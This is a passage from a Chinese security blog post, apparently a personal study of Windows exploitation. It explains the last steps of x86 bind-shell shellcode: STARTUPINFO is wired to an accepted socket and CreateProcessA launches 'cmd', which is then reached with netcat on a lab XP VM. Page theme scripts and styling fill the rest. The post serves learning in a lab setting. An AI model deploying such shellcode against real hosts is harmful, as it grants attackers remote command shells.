</span></span></span><br><span class="line"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span><br><span class="line"><span class="params">)</span>;  </span><br></pre></td></tr></table></figure>
+<p>其中lpStartupInfo用于和套接字绑定,重要</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   DWORD cb;            <span class="comment">//包含STARTUPINFO结构中的字节数.如果Microsoft将来扩展该结构,它可用作版本控制手段.</span></span><br><span class="line">                        <span class="comment">//应用程序必须将cb初始化为sizeof(STARTUPINFO)</span></span><br><span class="line">   PSTR lpReserved;      <span class="comment">//保留。必须初始化为N U L L</span></span><br><span class="line">   PSTR lpDesktop;    <span class="comment">//用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。</span></span><br><span class="line">                      <span class="comment">//如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。</span></span><br><span class="line">                     <span class="comment">//如果lpDesktop是NULL（这是最常见的情况),那么该进程将与当前桌面相关联</span></span><br><span class="line">   PSTR lpTitle;    <span class="comment">//用于设定控制台窗口的名称。如果l p Ti t l e 是N U L L ，则可执行文件的名字将用作窗口名</span></span><br><span class="line">   DWORD dwX;       <span class="comment">//用于设定应用程序窗口在屏幕上应该放置的位置的x 和y 坐标（以像素为单位）。</span></span><br><span class="line">   DWORD dwY;       <span class="comment">//只有当子进程用CW_USEDEFAULT作为CreateWindow的x参数来创建它的第一个重叠窗口时,</span></span><br><span class="line">                    <span class="comment">//才使用这两个坐标。若是创建控制台窗口的应用程序，这些成员用于指明控制台窗口的左上角</span></span><br><span class="line"></span><br><span class="line">   DWORD dwXSize;  <span class="comment">//用于设定应用程序窗口的宽度和长度（以像素为单位）只有dwYsize</span></span><br><span class="line">    DWORD dwYSize;   <span class="comment">//当子进程将C W _ U S E D E FA U LT 用作C r e a t e Wi n d o w 的</span></span><br><span class="line">                    <span class="comment">// n Wi d t h参数来创建它的第一个重叠窗口时，才使用这些值。</span></span><br><span class="line">                     <span class="comment">//若是创建控制台窗口的应用程序，这些成员将用于指明控制台窗口的宽度</span></span><br><span class="line">   DWORD dwXCountChars;  <span class="comment">//用于设定子应用程序的控制台窗口的宽度和高度（以字符为单位）</span></span><br><span class="line">   DWORD dwYCountChars;</span><br><span class="line">   DWORD dwFillAttribute;   <span class="comment">//用于设定子应用程序的控制台窗口使用的文本和背景颜色</span></span><br><span class="line">   DWORD dwFlags;           <span class="comment">//请参见下一段和表4 - 7 的说明</span></span><br><span class="line">   WORD wShowWindow;        <span class="comment">//用于设定如果子应用程序初次调用的S h o w Wi n d o w 将S W _ S H O W D E FA U LT 作为</span></span><br><span class="line">                             <span class="comment">// n C m d S h o w 参数传递时，该应用程序的第一个重叠窗口应该如何出现。</span></span><br><span class="line">                             <span class="comment">// 本成员可以是通常用于Show Wi n d o w 函数的任何一个S W _ *标识符</span></span><br><span class="line">   WORD cbReserved2;        <span class="comment">//保留。必须被初始化为0</span></span><br><span class="line">   PBYTE lpReserved2;       <span class="comment">//保留。必须被初始化为N U L L</span></span><br><span class="line">   HANDLE hStdInput;        <span class="comment">//用于设定供控制台输入和输出用的缓存的句柄。</span></span><br><span class="line">                            <span class="comment">//按照默认设置，h S t d I n p u t 用于标识键盘缓存，</span></span><br><span class="line">                           <span class="comment">// h S t d O u t p u t 和h S t d E r r o r用于标识控制台窗口的缓存</span></span><br><span class="line">   HANDLE hStdOutput;</span><br><span class="line">   HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFO, *LPSTARTUPINFO;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="初始化STARTUPINFO结构体"><a href="#初始化STARTUPINFO结构体" class="headerlink" title="初始化STARTUPINFO结构体"></a>初始化STARTUPINFO结构体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">	inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">	sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">	stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">							; (still in eax) as the stdin handle </span><br><span class="line">	stosd 					; same for stdout </span><br><span class="line">	stosd					; same for stderr (optional) </span><br></pre></td></tr></table></figure>
+<p>这里edi和esp已经离得很近了,在sub edi,0x6c之前</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918202314459"></p>
+<p>之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220918202330635"></p>
+<p>然后在edi的最后三个双字上(stdinput,stdout,stderr)都设置为eax中的套接字描述符</p>
+<p>剩余的字节都是0</p>
+<h3 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h3><p>栈顶位置还啥也没写,推给eax当0用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; create process </span><br><span class="line">	pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) </span><br><span class="line">	push esp			; use stack as PROCESSINFORMATION structure </span><br><span class="line">	; (STARTUPINFO now back to esp) </span><br><span class="line">	push esp 			; STARTUPINFO structure </span><br><span class="line">	push eax 		; lpCurrentDirectory = NULL </span><br><span class="line">	push eax 		; lpEnvironment = NULL </span><br><span class="line">	push eax 		; dwCreationFlags = NULL </span><br><span class="line">	push esp 			; bInheritHandles = true </span><br><span class="line">	push eax 		; lpThreadAttributes = NULL </span><br><span class="line">	push eax 		; lpProcessAttributes = NULL </span><br><span class="line">	push esi 			; lpCommandLine = &quot;cmd&quot; </span><br><span class="line">	push eax 		; lpApplicationName = NULL </span><br><span class="line">	call [esi - 0x1c] 	; CreateProcessA </span><br></pre></td></tr></table></figure>
+<p>这就创建了一个cmd进程,其三标都重定向到套接字了</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>windows XP靶机和win10主机采用NAT连接方式,XP靶机的ip地址为192.168.191.137</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="靶机地址"></p>
+<p>在主机上<code>nc 192.168.191.137 6666</code></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="通了"></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/windows-pwn/" class="">
+              windows pwn
+            </a>
+          
+        </div>
+        
+      </div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">010editor 模板语法</div>
+      </div>
+      <!-- <div class="content">
+        010editor 模板编写以linux上的归档文件AR,或者说windows上的静态库LIB为例看看模板是咋写的
+总的
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em; margin: 15px auto;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://raw.githubusercontent.com/DeutschBall/test/master/R.3c3e443dfe9ddbddc93730c482ed0461');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+  <script>
+  // https://github.com/theme-next/hexo-theme-next/blob/master/layout/_third-party/math/mathjax.swig
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.0/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    // 文章章节标题不能为 “MathJax” ，否则会报错。
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">Deutschball</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Deutschball</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+<script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({theme: 'forest'});
+  }
+</script>
+
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "copy that",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <!-- 弹幕所需的css和js -->
+    
+<!-- 具体js，请前往valine/script.ejs查看 -->
+
+    <script>
+  var requiredFields = '';
